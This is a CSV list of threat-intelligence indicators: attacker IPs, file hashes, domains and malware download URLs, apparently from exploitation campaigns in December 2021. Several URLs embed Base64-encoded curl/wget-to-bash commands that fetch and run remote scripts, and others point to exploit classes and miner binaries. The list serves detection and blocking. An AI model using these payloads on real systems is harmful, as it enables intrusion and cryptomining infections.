category,type,value,date
Network activity,ip-dst,185.220.102.245,1639339574
Network activity,ip-dst,185.220.102.246,1639339574
Network activity,ip-dst,185.220.102.249,1639339574
Network activity,ip-dst,185.220.102.250,1639339574
Network activity,ip-dst,185.220.102.252,1639339574
Network activity,ip-dst,185.220.102.253,1639339574
Network activity,ip-dst,185.220.102.254,1639339574
Network activity,ip-dst,185.220.102.4,1639339574
Network activity,ip-dst,185.220.102.6,1639339574
Network activity,ip-dst,185.220.102.7,1639339574
Network activity,ip-dst,185.220.102.8,1639339574
Network activity,ip-dst,185.220.103.116,1639339574
Network activity,ip-dst,185.220.103.117,1639339574
Network activity,ip-dst,185.220.103.119,1639339574
Network activity,ip-dst,185.220.103.4,1639339574
Network activity,ip-dst,185.220.103.5,1639339574
Network activity,ip-dst,185.220.103.7,1639339574
Network activity,ip-dst,185.220.103.8,1639339574
Network activity,ip-dst,185.232.23.46,1639339574
Network activity,ip-dst,185.236.200.117,1639339574
Network activity,ip-dst,185.244.214.217,1639339574
Network activity,ip-dst,185.250.148.157,1639339574
Network activity,ip-dst,185.38.175.130,1639339574
Network activity,ip-dst,185.38.175.131,1639339574
Network activity,ip-dst,185.38.175.132,1639339574
Network activity,ip-dst,185.4.132.183,1639339574
Network activity,ip-dst,185.51.76.187,1639339574
Network activity,ip-dst,185.56.80.65,1639339574
Network activity,ip-dst,185.83.214.69,1639339574
Network activity,ip-dst,188.120.246.215,1639339574
Network activity,ip-dst,188.166.102.47,1639339574
Network activity,ip-dst,188.166.105.150,1639339574
Network activity,ip-dst,188.166.122.43,1639339574
Network activity,ip-dst,188.166.223.38,1639339574
Network activity,ip-dst,188.166.225.104,1639339574
Network activity,ip-dst,188.166.45.93,1639339574
Network activity,ip-dst,188.166.48.55,1639339574
Network activity,ip-dst,188.166.74.97,1639339574
Network activity,ip-dst,188.166.76.204,1639339574
Network activity,ip-dst,188.166.86.206,1639339574
Network activity,ip-dst,188.166.92.228,1639339574
Network activity,ip-dst,188.241.156.221,1639339574
Network activity,ip-dst,191.232.38.25,1639339574
Network activity,ip-dst,192.160.102.169,1639339574
Network activity,ip-dst,192.42.116.19,1639339574
Network activity,ip-dst,192.81.130.207,1639339574
Network activity,ip-dst,192.99.152.200,1639339574
Network activity,ip-dst,193.110.95.34,1639339574
Network activity,ip-dst,193.189.100.195,1639339574
Network activity,ip-dst,193.189.100.196,1639339574
Network activity,ip-dst,193.189.100.201,1639339574
Network activity,ip-dst,193.189.100.202,1639339574
Network activity,ip-dst,193.189.100.203,1639339574
Network activity,ip-dst,193.218.118.183,1639339574
Network activity,ip-dst,193.218.118.231,1639339574
Network activity,ip-dst,193.239.232.101,1639339574
Network activity,ip-dst,193.239.232.102,1639339574
Network activity,ip-dst,193.31.24.154,1639339574
Network activity,ip-dst,194.135.33.152,1639339574
Network activity,ip-dst,194.163.133.36,1639339574
Network activity,ip-dst,194.163.44.188,1639339574
Network activity,ip-dst,194.163.45.31,1639339574
Network activity,ip-dst,194.48.199.78,1639339574
Network activity,ip-dst|port,194.59.165.21|8080,1639339574
Network activity,ip-dst,195.123.247.209,1639339574
Network activity,ip-dst|port,195.133.40.15|25565,1639339574
Network activity,ip-dst,195.176.3.19,1639339574
Network activity,ip-dst,195.176.3.23,1639339574
Network activity,ip-dst,195.176.3.24,1639339574
Network activity,ip-dst,195.19.192.26,1639339574
Network activity,ip-dst,195.206.105.217,1639339574
Network activity,ip-dst,195.251.41.139,1639339574
Network activity,ip-dst,195.254.135.76,1639339574
Network activity,ip-dst,197.246.171.111,1639339574
Network activity,ip-dst,197.246.171.83,1639339574
Network activity,ip-dst,198.144.121.43,1639339574
Network activity,ip-dst,198.96.155.3,1639339574
Network activity,ip-dst,198.98.51.189,1639339574
Network activity,ip-dst,198.98.57.191,1639339574
Network activity,ip-dst,198.98.57.207,1639339574
Network activity,ip-dst,198.98.60.19,1639339574
Network activity,ip-dst,199.195.250.77,1639339574
Network activity,ip-dst,199.195.253.162,1639339574
Network activity,ip-dst,199.217.117.92,1639339574
Network activity,ip-dst,199.249.230.110,1639339574
Network activity,ip-dst,199.249.230.158,1639339574
Payload delivery,sha256,1de182015b280f40b04faac87424f3ae00db8bc90b3ec5d7c02092d72ca1b21e,1639339574
Payload delivery,sha256,1f09bc7eb818beb01f304e96589e5239d3dc525a7b14ce902386211e4ec20b09,1639339574
Payload delivery,md5,1fe52c0b0139660b2335dd7b7c12ea05,1639339574
Network activity,ip-dst,20.205.104.227,1639339574
Network activity,ip-dst,20.71.156.146,1639339574
Network activity,ip-dst,204.8.156.142,1639339574
Network activity,ip-dst,205.185.115.217,1639339574
Network activity,ip-dst,205.185.115.45,1639339574
Network activity,ip-dst,205.185.117.149,1639339574
Network activity,ip-dst,205.185.126.167,1639339574
Network activity,ip-dst,205.185.127.35,1639339574
Network activity,ip-dst,206.189.20.141,1639339574
Network activity,ip-dst,207.180.202.75,1639339574
Network activity,ip-dst,207.237.69.72,1639339574
Network activity,ip-dst,209.127.17.234,1639339574
Network activity,ip-dst,209.127.17.242,1639339574
Network activity,ip-dst,209.141.34.232,1639339574
Network activity,ip-dst,209.141.36.206,1639339574
Network activity,ip-dst,209.141.41.103,1639339574
Network activity,ip-dst,209.141.45.189,1639339574
Network activity,ip-dst,209.141.45.227,1639339574
Network activity,ip-dst,209.141.49.232,1639339574
Network activity,ip-dst,209.97.147.103,1639339574
Network activity,ip-dst|port,210.141.105.67|80,1639339574
Network activity,ip-dst,211.154.194.21,1639339574
Network activity,ip-dst,212.109.197.1,1639339574
Network activity,ip-dst,212.192.216.30,1639339574
Network activity,ip-dst,212.192.246.95,1639339574
Network activity,ip-dst,212.193.30.142,1639339574
Network activity,ip-dst,212.193.57.225,1639339574
Network activity,ip-dst,212.47.237.67,1639339574
Network activity,ip-dst,213.202.216.189,1639339574
Network activity,ip-dst,213.61.215.54,1639339574
Network activity,ip-dst,213.95.149.22,1639339574
Network activity,ip-dst,216.218.134.12,1639339574
Network activity,ip-dst,217.112.83.246,1639339574
Network activity,ip-dst,221.199.187.100,1639339574
Network activity,ip-dst,23.120.182.121,1639339574
Network activity,ip-dst,23.129.64.131,1639339574
Network activity,ip-dst,23.129.64.132,1639339574
Network activity,ip-dst,23.129.64.133,1639339574
Network activity,ip-dst,23.129.64.135,1639339574
Network activity,ip-dst,23.129.64.137,1639339574
Network activity,ip-dst,23.129.64.139,1639339574
Network activity,ip-dst,23.129.64.140,1639339574
Network activity,ip-dst,23.129.64.141,1639339574
Network activity,ip-dst,23.129.64.145,1639339574
Network activity,ip-dst,23.129.64.146,1639339574
Network activity,ip-dst,23.129.64.148,1639339574
Network activity,ip-dst,23.129.64.149,1639339574
Network activity,ip-dst,23.154.177.2,1639339574
Network activity,ip-dst,23.154.177.4,1639339574
Network activity,ip-dst,23.154.177.7,1639339574
Network activity,ip-dst,23.160.193.176,1639339574
Network activity,ip-dst,23.183.83.71,1639339574
Network activity,ip-dst,23.184.48.209,1639339574
Payload delivery,md5,23b317600f4d82ea58c6b39b6eb5a67c,1639339574
Network activity,ip-dst,24.220.112.166,1639339574
Payload delivery,md5,2615ebcd4c82d8822ce0b58725938cc6,1639339574
Payload delivery,sha256,2a68fb75fdfb94a63d666a51111ebf38c5d51844e5002d13cba9839102d67653,1639339574
Network activity,ip-dst,3.1.9.2,1639339574
Network activity,ip-dst,3.26.198.32,1639339574
Network activity,ip-dst,3.94.114.30,1639339575
Network activity,ip-dst,31.42.184.34,1639339575
Network activity,ip-dst,31.42.186.101,1639339575
Network activity,ip-dst,34.124.226.216,1639339575
Network activity,ip-dst,34.247.50.189,1639339575
Network activity,ip-dst,35.170.71.122,1639339575
Network activity,ip-dst,35.232.163.113,1639339575
Network activity,ip-dst,35.76.31.198,1639339575
Network activity,ip-dst,36.227.164.189,1639339575
Network activity,ip-dst,37.120.232.51,1639339575
Network activity,ip-dst,37.123.163.58,1639339575
Network activity,ip-dst,37.187.122.82,1639339575
Network activity,ip-dst,37.19.212.104,1639339575
Network activity,ip-dst,37.228.129.109,1639339575
Payload delivery,sha256,397ee39d591abe45648d55feb3aaf98258eda59ccf36b2a6d9bc2198eb2ea2b2,1639339575
Payload delivery,md5,3dfbe75871e218d08328a01c56e1bb42,1639339575
Payload delivery,sha256,3f6120ca0ff7cf6389ce392d4018a5e40b131a083b071187bf54c900e2edad26,1639339575
Network activity,ip-dst,40.64.92.153,1639339575
Network activity,ip-dst,40.64.92.157,1639339575
Network activity,ip-dst,40.64.92.158,1639339575
Network activity,ip-dst,40.64.92.159,1639339575
Payload delivery,md5,40e3b969906c1a3315e821a8461216bb,1639339575
Network activity,ip-dst,45.12.134.108,1639339575
Network activity,ip-dst,45.129.56.200,1639339575
Network activity,ip-dst,45.13.104.179,1639339575
Network activity,ip-dst,45.130.229.168,1639339575
Network activity,ip-dst|port,45.130.229.168|1389,1639339575
Network activity,ip-dst|port,45.130.229.168|9999,1639339575
Network activity,ip-dst,45.137.184.31,1639339575
Network activity,ip-dst,45.137.21.9,1639339575
Network activity,ip-dst,45.15.16.70,1639339575
Network activity,ip-dst,45.153.160.130,1639339575
Network activity,ip-dst,45.153.160.131,1639339575
Network activity,ip-dst,45.153.160.133,1639339575
Network activity,ip-dst,45.153.160.134,1639339575
Network activity,ip-dst,45.153.160.135,1639339575
Network activity,ip-dst,45.153.160.136,1639339575
Network activity,ip-dst,45.153.160.138,1639339575
Network activity,ip-dst,45.153.160.139,1639339575
Network activity,ip-dst,45.153.160.140,1639339575
Network activity,ip-dst,45.153.160.2,1639339575
Network activity,ip-dst,45.154.255.147,1639339575
Network activity,ip-dst,45.155.205.233,1639339575
Network activity,ip-dst|port,45.155.205.233|12344,1639339575
Network activity,ip-dst|port,45.155.205.233|5874,1639339575
Network activity,ip-dst,45.33.120.240,1639339575
Network activity,ip-dst,45.61.185.54,1639339575
Network activity,ip-dst,45.61.186.225,1639339575
Network activity,ip-dst,45.83.193.150,1639339575
Network activity,ip-dst,46.101.223.115,1639339575
Network activity,ip-dst,46.105.95.220,1639339575
Network activity,ip-dst,46.166.139.111,1639339575
Network activity,ip-dst,46.173.218.146,1639339575
Network activity,ip-dst,46.182.21.248,1639339575
Network activity,ip-dst,46.4.51.212,1639339575
Network activity,ip-dst,47.254.127.78,1639339575
Payload delivery,sha256,4b8e0b70c420d83041629b71404c4d9cb942851a6a0a207b0b353fca4ad289d2,1639339575
Network activity,ip-dst,5.157.38.50,1639339575
Network activity,ip-dst,5.182.210.216,1639339575
Network activity,ip-dst,5.183.209.217,1639339575
Network activity,ip-dst,5.199.143.202,1639339575
Network activity,ip-dst,5.2.69.50,1639339575
Network activity,ip-dst,5.2.70.140,1639339575
Network activity,ip-dst,5.2.72.73,1639339575
Network activity,ip-dst,5.22.208.77,1639339575
Network activity,ip-dst,51.15.180.36,1639339575
Network activity,ip-dst,51.15.43.205,1639339575
Network activity,ip-dst,51.15.59.15,1639339575
Network activity,ip-dst,51.15.76.60,1639339575
Network activity,ip-dst,51.195.45.190,1639339575
Network activity,ip-dst,51.255.106.85,1639339575
Network activity,ip-dst,51.75.161.78,1639339575
Network activity,ip-dst,51.77.52.216,1639339575
Network activity,ip-dst,52.200.111.193,1639339575
Network activity,ip-dst,52.232.211.160,1639339575
Network activity,ip-dst,52.232.211.163,1639339575
Network activity,ip-dst,52.232.211.166,1639339575
Network activity,ip-dst,52.232.211.167,1639339575
Network activity,ip-dst,52.95.72.73,1639339575
Network activity,ip-dst,54.173.99.121,1639339575
Payload delivery,sha256,5621a68c852e0f11a813bbe6cfec2a6419654a31d9da7534fd2a835381f8f90a,1639339575
Network activity,ip-dst,6.0.1.0,1639339575
Network activity,ip-dst,60.31.180.149,1639339575
Network activity,ip-dst,61.19.25.207,1639339575
Network activity,ip-dst,62.102.148.68,1639339575
Network activity,ip-dst,62.102.148.69,1639339575
Network activity,ip-dst,62.171.142.3,1639339575
Network activity,ip-dst,62.181.147.15,1639339575
Network activity,ip-dst,62.210.130.250,1639339575
Network activity,ip-dst,62.76.41.46,1639339575
Network activity,ip-dst,64.113.32.29,1639339575
Network activity,ip-dst,64.227.67.110,1639339575
Payload delivery,md5,648effa354b3cbaad87b45f48d59c616,1639339575
Network activity,ip-dst,66.220.242.222,1639339575
Network activity,ip-dst,67.149.209.200,1639339575
Network activity,ip-dst,67.205.170.85,1639339575
Network activity,ip-dst,68.183.192.239,1639339575
Network activity,ip-dst,68.183.198.247,1639339575
Network activity,ip-dst,68.183.198.36,1639339575
Network activity,ip-dst,68.183.207.73,1639339575
Network activity,ip-dst,68.183.33.144,1639339575
Network activity,ip-dst,68.183.35.171,1639339575
Network activity,ip-dst,68.183.36.244,1639339575
Network activity,ip-dst,68.183.41.150,1639339575
Network activity,ip-dst,68.183.44.143,1639339575
Network activity,ip-dst,68.183.45.190,1639339575
Network activity,ip-dst,68.79.17.59,1639339575
Payload delivery,sha256,6b9e23cb675be370a18a0c4482dc566be28920d4f1cd8ba6b4527f80acf978d3,1639339575
Payload delivery,md5,6d275af23910c5a31b2d9684bbb9c6f3,1639339575
Payload delivery,sha256,6e25ad03103a1a972b78c642bac09060fa79c460011dc5748cbb433cc459938b,1639339575
Payload delivery,sha256,704db1ff3acb38583727ed870f48dc67b70ea9f09882ff56a927a82283d9837d,1639339575
Network activity,ip-dst,72.223.168.73,1639339575
Network activity,ip-dst|port,78.31.71.248|1389,1639339575
Network activity,ip-dst,79.146.170.248,1639339575
Payload delivery,sha256,7937bbe245511e3666b1f90661bc5fff1ae7bcb1cfda1e5aad9976b66d871c7f,1639339575
Payload delivery,md5,7b72cf30ac42c20f0a14b0b87425c00a,1639339575
Payload delivery,sha256,7e9663f87255ae2ff78eb882efe8736431368f341849fec000543f027bdb4512,1639339575
Network activity,ip-dst,80.71.158.12,1639339575
Network activity,url,80.71.158.12/lh.sh,1639339575
Network activity,ip-dst|port,80.71.158.12|5557,1639339575
Network activity,ip-dst|port,80.71.158.12|80,1639339575
Network activity,ip-dst,80.71.158.44,1639339575
Network activity,url,80.71.158.44/lh.sh,1639339575
Network activity,ip-dst,81.17.18.59,1639339575
Network activity,ip-dst,81.17.18.60,1639339575
Network activity,ip-dst,81.17.18.61,1639339575
Network activity,ip-dst,81.17.18.62,1639339575
Network activity,ip-dst,81.6.43.167,1639339575
Payload delivery,md5,81fbe69a36650504b88756074a36c183,1639339575
Network activity,ip-dst,82.118.18.201,1639339575
Network activity,ip-dst,82.221.131.71,1639339575
Network activity,ip-dst,85.10.195.175,1639339575
Network activity,ip-dst,85.93.218.204,1639339575
Network activity,ip-dst,87.118.110.27,1639339575
Network activity,ip-dst,88.80.20.86,1639339575
Network activity,ip-dst,89.163.143.8,1639339575
Network activity,ip-dst,89.163.154.91,1639339575
Network activity,ip-dst,89.163.243.88,1639339575
Network activity,ip-dst,89.163.252.230,1639339575
Network activity,ip-dst,89.163.252.30,1639339575
Network activity,ip-dst,89.187.162.98,1639339575
Network activity,ip-dst,89.249.63.3,1639339575
Network activity,ip-dst,89.35.30.236,1639339575
Network activity,ip-dst,9.9.9.11,1639339575
Network activity,ip-dst,91.203.5.146,1639339575
Network activity,ip-dst,91.219.237.21,1639339575
Network activity,ip-dst,91.245.81.65,1639339575
Network activity,ip-dst,92.151.52.150,1639339575
Network activity,ip-dst,92.223.89.187,1639339575
Network activity,ip-dst,92.242.40.21,1639339575
Network activity,ip-dst,93.189.42.8,1639339575
Payload delivery,sha256,93a9db9e9e617e460c3f27073337693e43639edb4c551c7ded86ec57039a42f8,1639339575
Network activity,ip-dst,94.142.241.194,1639339575
Network activity,ip-dst,94.230.208.147,1639339575
Network activity,ip-dst,95.214.54.97,1639339575
Network activity,ip-dst,95.216.226.236,1639339575
Payload delivery,md5,95d9a068529dd2ea4bb4bef644f5c4f5,1639339575
Network activity,ip-dst,98.220.130.144,1639339575
Network activity,domain,bingsearchlib.com,1639339575
Network activity,hostname,bvprzqhoz7j2ltin.onion.ly,1639339575
Network activity,hostname,bvprzqhoz7j2ltin.onion.ws,1639339575
Network activity,hostname,bvprzqhoz7j2ltin.tor2web.su,1639339575
Payload delivery,sha256,c38c21120d8c17688f9aeb2af5bdafb6b75e1d2673b025b720e50232f888808a,1639339575
Payload delivery,md5,ccef46c7edf9131ccffc47bd69eb743b,1639339575
Payload delivery,md5,cf2ce888781958e929be430de173a0f8,1639339575
Payload delivery,md5,d20478a01344026a0ecd60b0b29e9bc1,1639339575
Payload delivery,md5,d9f82dbf8733f15f97fb352467c9ab21,1639339575
Payload delivery,md5,dbc9125192bd1994cbb764f577ba5dda,1639339575
Network activity,domain,dnslog.cn,1639339575
Network activity,domain,exposedbotnets.ru,1639339575
Payload delivery,md5,f14019c55e7ce19d93838a4b2f6aec12,1639339575
Payload delivery,md5,ff171712ab8816f3d7600fe75bb18052,1639339575
Network activity,url,http://103.104.73.155:8080/index,1639339575
Network activity,url,http://138.197.206.223/.x/xmra32,1639339575
Network activity,url,http://138.197.206.223/.x/xmra64,1639339575
Network activity,url,http://159.89.182.117/wp-content/themes/twentyseventeen/l,1639339575
Network activity,url,http://18.228.7.109/.log/log,1639339575
Network activity,url,http://18.228.7.109/.log/pty1,1639339575
Network activity,url,http://18.228.7.109/.log/pty2,1639339575
Network activity,url,http://18.228.7.109/.log/pty3,1639339575
Network activity,url,http://18.228.7.109/.log/pty4,1639339575
Network activity,url,http://18.228.7.109/.log/pty5,1639339575
Network activity,url,http://185.154.53.140/get,1639339575
Network activity,url,http://185.154.53.140/mg,1639339575
Network activity,url,http://185.154.53.140/ms,1639339575
Network activity,url,http://185.154.53.140/o,1639339575
Network activity,url,http://185.154.53.140/s,1639339575
Network activity,url,http://185.191.32.198/ex.sh,1639339575
Network activity,url,http://185.191.32.198/lh.sh,1639339575
Network activity,url,http://185.191.32.198/unk.sh,1639339575
Network activity,url,http://185.250.148.157:8005/acc,1639339575
Network activity,url,http://210.141.105.67/wp-content/themes/twentythirteen/m8,1639339575
Network activity,url,http://45.137.155.55/cron.sh,1639339575
Network activity,url,http://45.137.155.55/ex.sh,1639339575
Network activity,url,http://62.210.130.250/lh.sh,1639339575
Network activity,url,http://62.210.130.250/web/admin/x86,1639339575
Network activity,url,http://62.210.130.250/web/admin/x86_64,1639339575
Network activity,url,http://80.71.158.12/curl-amd64,1639339575
Network activity,url,http://80.71.158.12/kinsing,1639339575
Network activity,url,http://80.71.158.12/lh.sh,1639339575
Network activity,url,http://80.71.158.12/libsystem.so,1639339575
Network activity,url,http://82.118.18.201/cron.sh,1639339575
Network activity,url,http://82.118.18.201/curl-amd64,1639339575
Network activity,url,http://82.118.18.201/kinsing,1639339575
Network activity,url,http://82.118.18.201/lh.sh,1639339575
Network activity,url,http://82.118.18.201/libsystem.so,1639339575
Network activity,url,http://92.242.40.21/lh2.sh,1639339575
Network activity,url,http://93.189.42.8/kinsing,1639339575
Network activity,url,http://93.189.42.8/lh.sh,1639339575
Network activity,url,http://015ed9119662.bingsearchlib.com:39356/a,1639339575
Network activity,url,http://110.42.239.3/2.hta,1639339575
Network activity,url,http://114.132.231.19/0.hta,1639339575
Network activity,url,http://114.132.231.19/2.hta,1639339575
Network activity,url,http://114.132.231.19/OK1.hta,1639339575
Network activity,url,http://114.132.231.19/hfs.exe,1639339575
Network activity,url,http://134.209.163.248/callback/,1639339575
Network activity,url,http://159.89.182.117/wp-content/themes/twentyseventeen/ldm,1639339575
Network activity,url,http://18.228.7.109/.log/,1639339575
Network activity,url,http://195.19.192.28/kinsing,1639339575
Network activity,url,http://32fce0c1f193.bingsearchlib.com:39356/a,1639339575
Network activity,url,http://34.221.40.237/.x/,1639339575
Network activity,url,http://3be6466b6a20.bingsearchlib.com:39356/a,1639339575
Network activity,url,http://45.130.229.168:1389/Exploit,1639339575
Network activity,url,http://45.130.229.168:9999/Exploit.class,1639339575
Network activity,url,http://45.137.155.55/kinsing,1639339575
Network activity,url,http://45.155.205.233:12344/Basic/Command/Base64/KGN1cmwgLXMgNDUuMTU1LjIwNS4yMzM6NTg3NC84Ny4xMzguMTM5Ljc2OjQ0M3x8d2dldCAtcSAtTy0gNDUuMTU1LjIwNS4yMzM6NTg3NC84Ny4xMzguMTM5Ljc2OjQ0Myl8YmFzaA==,1639339575
Network activity,url,http://45.155.205.233:12344/Basic/Command/Base64/KGN1cmwgLXMgNDUuMTU1LjIwNS4yMzM6NTg3NC9bdmljdGltIElQXTpbdmljdGltIHBvcnRdfHx3Z2V0IC1xIC1PLSA0NS4xNTUuMjA1LjIzMzo1ODc0L1t2aWN0aW0gSVBdOlt2aWN0aW0gcG9ydF0pfGJhc2gK,1639339575
Network activity,url,http://45.155.205.233:5874/87.138.139.76,1639339575
Network activity,url,http://62.210.130.250/web/admin/,1639339575
Network activity,url,http://62.210.130.250/web/admin/x86_g,1639339575
Network activity,url,http://6c8d7dd40593.bingsearchlib.com:39356/a,1639339575
Network activity,url,http://78.31.71.248:1389/lewrgz,1639339575
Network activity,url,http://7faf976567f5.bingsearchlib.com:39356/a,1639339575
Network activity,url,http://80.71.158.12/Exploit69ogQNSQYz.class,1639339575
Network activity,url,http://80.71.158.12:5557/Basic/Command/Base64/KGN1cmwgLXMgODAuNzEuMTU4LjEyL2xoLnNofHx3Z2V0IC1xIC1PLSA4MC43MS4xNTguMTIvbGguc2gpfGJhc2g=,1639339575
Network activity,url,http://80.71.158.44/lh.sh,1639339575
Network activity,url,http://92.242.40.21/curl-amd64,1639339575
Network activity,url,http://92.242.40.21/kinsing,1639339575
Network activity,url,http://92.242.40.21/lh.sh,1639339575
Network activity,url,http://e86eafcf9294.bingsearchlib.com:39356/a,1639339575
Network activity,url,https://libsystem.so,1639339575
Network activity,hostname,log.exposedbotnets.ru,1639339575
Network activity,domain,nazi.uy,1639339575
Network activity,domain,nmsl.run,1639339575
Network activity,domain,viperdns.xyz,1639339575
Network activity,domain,wdnmdnmsl.xyz,1639339575
